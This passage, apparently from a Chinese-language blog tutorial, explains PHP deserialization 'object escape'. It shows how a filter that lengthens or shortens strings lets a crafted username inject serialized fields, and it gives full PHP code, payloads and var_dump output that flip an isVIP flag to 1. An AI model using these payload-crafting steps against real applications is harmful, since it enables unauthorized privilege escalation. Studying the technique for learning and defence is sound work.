class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>那么我们的 admin 就会被替换为 hacker</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;  //未过滤</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;hacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; //已过滤</span><br></pre></td></tr></table></figure>\n<p>仔细看，虽然 admin 变为了 hacker，但长度并没有从 5 变成 6，<strong>因此我们可以使用对象逃逸将 isVIP 变为 1</strong></p>\n<p>在字符变多的对象逃逸中，我们需要构造我们需要的 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;    //length=47</span><br></pre></td></tr></table></figure>\n<p>因为我们需要逃逸的字符串长度为<strong> 47</strong>，并且<strong> admin</strong> 每次过滤之后都会变成<strong> hacker</strong>，也就是说每出现一次<strong> admin</strong>，就会多<strong> 1</strong> 个字符。</p>\n<p>因此我们需要重复 47 遍 admin，这样他过滤 47 遍，我们的目标 payload 就可以完全覆盖了</p>\n<p>因此我们在可控变量处，重复<strong> 47</strong> 遍<strong> admin</strong>，然后加上我们逃逸后的目标子串，可控变量修改如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>\n<p>然后我们利用代码做拼接形成完整的 payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;hacker&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>,<span class=\"string\">&#x27;123456&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">//上面的第一个&#x27;&#x27;中是我们构造的目标串，第二个&#x27;&#x27;中是马上要被覆盖的串</span></span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a_seri</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri_filter</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span></span><br></pre></td></tr></table></figure>\n<p>由于<strong>反序列化后，多余的子串会被抛弃</strong>， <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125; </code> 我们可以直接无视</p>\n<p>尝试反序列化验证我们的 isVIP 是否变为了 1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"string\">&#x27;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter_unseri</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$a_seri_filter</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"variable\">$a_seri_filter_unseri</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//result：</span></span><br><span class=\"line\"><span class=\"keyword\">object</span>(user)<span class=\"comment\">#1 (3) &#123;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;username&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">string</span>(<span class=\"number\">282</span>) <span class=\"string\">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;password&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">string</span>(<span class=\"number\">6</span>) <span class=\"string\">&quot;123456&quot;</span></span><br><span class=\"line\">  [<span class=\"string\">&quot;isVIP&quot;</span>]=&gt;</span><br><span class=\"line\">  <span class=\"keyword\">int</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>那么，灵魂拷问，上面的 username 和 password 都是可控参数，那么我能能不能控制 password 字段？</p>\n<p>在这个例子中是不可以的，因为我们不能对用户的密码做替换，但是如果这个字段不是 password，是 nickname 这样的会被过滤的，那么我们的 payload 也可以写在 nickname 中</p>\n<p>最后，我们总结一下，想要通过过滤后字符串变多来实现对象逃逸，我们需要哪些步骤</p>\n<blockquote>\n<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>\n<p>​\t上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>\n<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>\n<p>​\t上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>\n<p>3. 分析它的过滤函数，得到每次过滤我们可以逃逸出的字符数量，与我们的 (2) 中 payload 相比，凑够（2）中字符的数量</p>\n<p>​\t上述例子中，我们从 admin 变为 hacker，每次过滤字符多一个，因此我们要逃逸 47 个字符，我们就需要重复 47 遍 admin</p>\n<p>4. 将我们构造的 payload 放到程序中，得到完整的 payload：</p>\n<p>​\t上述例子中，我们构造的 payload 是：</p>\n<p><code>adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code></p>\n<p>通过程序：</p>\n<p><code>$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;','123456');</code></p>\n<p>生成我们最终的 payload：</p>\n<p><code>O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</code></p>\n<p>5.unserialize 进行验证</p>\n</blockquote>\n<h5 id=\"过滤后字符变少\"><a class=\"markdownIt-Anchor\" href=\"#过滤后字符变少\">#</a> 过滤后字符变少</h5>\n<p>同样的过滤，这次将 admin 变为 hack</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">user</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"variable\">$isVIP</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$u</span>,<span class=\"variable\">$p</span></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$u</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$p</span>;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">$this</span>-&gt;isVIP = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$s</span></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"string\">&quot;hack&quot;</span>,<span class=\"variable\">$s</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">user</span>(<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"string\">&#x27;123456&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$a_seri_filter</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"variable\">$a_seri</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$a_seri_filter</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">result:</span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;user&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;username&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;hack&quot;</span>;s:<span class=\"number\">8</span>:<span class=\"string\">&quot;password&quot;</span>;s:<span class=\"number\">6</span>:<span class=\"string\">&quot;123456&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;isVIP&quot;</span>;i:<span class=\"number\">0</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>同样，我们想把 isVIP 变为 1，比较一下<strong>现有子串</strong>和<strong>目标子串</strong>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;\t//现有子串</span><br><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;\t//目标子串</span><br></pre></td></tr></table></figure>\n<p>因为过滤的时候，将<strong> 5</strong> 个字符删减为了<strong> 4</strong> 个，所以和上面字符变多的情况相反，随着加入的<strong> admin</strong> 的数量增多，<strong>现有子串</strong>后面会缩进来。</p>\n<p>计算一下<strong>目标子串</strong>的长度：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;\t//目标子串</span><br><span class=\"line\">//长度为47</span><br></pre></td></tr></table></figure>\n<p>再计算一下到<strong>下一个可控变量</strong>的字符串长度：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;;s:8:&quot;password&quot;;s:6:&quot;</span><br><span class=\"line\">//长度为22</span><br></pre></td></tr></table></figure>\n<p>因为每次过滤的时候都会少<strong> 1</strong> 个字符，因此我们先将<strong> admin</strong> 字符重复<strong> 22</strong> 遍，这里 22 遍是大概值，后续还需要调整</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;123456&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>** 注意：**PHP 反序列化的机制是，比如如果前面是规定了有 10 个字符，但是只读到了 9 个就到了双引号，这个时候 PHP 会把双引号当做第 10 个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>\n<p>105 个字符结束后，位置如下</p>\n<p><code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:6:</code></p>\n<p>也就是我们覆盖了 <code>;s:8:&quot;password&quot;;s:6:</code> ，接下来我们的 username 的值变会覆盖后续的字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\"></span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:105:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>仔细观察这一串字符串可以我们希望覆盖的 107 个字符，但是前面只有显示 105</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</span><br></pre></td></tr></table></figure>\n<p><strong>解决办法是</strong>：多添加<strong> 2</strong> 个<strong> admin</strong>，这样就可以补上缺少的字符。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $a_seri_filter;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br></pre></td></tr></table></figure>\n<p>115 个字符的覆盖范围 <code>hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;</code></p>\n<p>可以看到，这一下就对了。</p>\n<p>我们将对象反序列化然后输出，代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class user&#123;</span><br><span class=\"line\">\tpublic $username;</span><br><span class=\"line\">\tpublic $password;</span><br><span class=\"line\">\tpublic $isVIP;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic function __construct($u,$p)&#123;</span><br><span class=\"line\">\t\t$this-&gt;username = $u;</span><br><span class=\"line\">\t\t$this-&gt;password = $p;</span><br><span class=\"line\">\t\t$this-&gt;isVIP = 0;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function filter($s)&#123;</span><br><span class=\"line\">\treturn str_replace(&quot;admin&quot;,&quot;hack&quot;,$s);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = new user(&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;,&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;);</span><br><span class=\"line\">$a_seri = serialize($a);</span><br><span class=\"line\">$a_seri_filter = filter($a_seri);</span><br><span class=\"line\">$a_seri_filter_unseri = unserialize($a_seri_filter);</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($a_seri_filter_unseri);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>得到结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">object(user)#2 (3) &#123;</span><br><span class=\"line\">  [&quot;username&quot;]=&gt;</span><br><span class=\"line\">  string(115) &quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;</span><br><span class=\"line\">  [&quot;password&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;123456&quot;</span><br><span class=\"line\">  [&quot;isVIP&quot;]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>总结一下变短的步骤：</p>\n<blockquote>\n<p>1. 分析他过滤了那个参数，那个参数是我们可控的</p>\n<p>​\t上述例子中 username，password 是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>\n<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>\n<p>​\t上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>\n<p>3. 分析它的过滤函数，计算到下一个可控变量的长度，将它和（2）中的长度分析</p>\n<p>​\t上述例子中，我们的目标长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>  为 47，到下一个可控变量长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;</code>  为 22</p>\n<p>​\t那么为什么要分析到下一个可控变量的长度呢，因为这中间的 22 个字符就是我们想要吃掉的字符，也就是 username 把原来的 password 吃掉了，现在的 password 我们自己可以写了，我们在自己写的 password 中就可以覆盖掉 isVIP</p>\n<p>4. 进行覆盖与调整</p>\n<p>​\t上述例子中，我们第一次写了 22 个 admin，但后续序列化后发现长度不够，增加至 24 个 admin。调整是为了让每个变量的 &quot; 的位置和前面的字符串数量的位置相同</p>\n<p>5. 进行反序列化验证</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//变长</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//变少</span><br><span 